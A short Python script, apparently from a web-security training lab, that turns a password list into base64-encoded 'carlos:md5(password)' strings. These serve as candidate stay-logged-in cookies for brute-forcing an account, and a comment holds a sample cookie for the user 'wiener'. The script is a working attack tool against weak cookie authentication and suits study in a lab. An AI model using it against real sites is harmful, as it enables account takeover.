import pathlib
import hashlib
import base64

# d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw // Wiener Cookie

WORKSPACE = pathlib.Path(__file__).parent
num_lines = 0

def to_md5(text: str) -> str:
    return hashlib.md5(
        text.encode(encoding="utf-8")
    ).hexdigest()

def encode_base64(text: str) -> str:
    return base64.b64encode(
        text.encode(encoding="utf-8")
    ).decode(encoding="utf-8")


with open(WORKSPACE / "original_pwd_list.txt", "r") as f:
    lines = f.readlines()
    
    cookies = []

    for index, line in enumerate(lines):
        pwd = line.strip()

        text = encode_base64(
            f"{"carlos"}:{to_md5(pwd)}"
        ) + "\n"

        cookies.append(text)
    

    with open(WORKSPACE / "brute_force_cookies.txt", "w") as f:
        f.writelines(cookies)
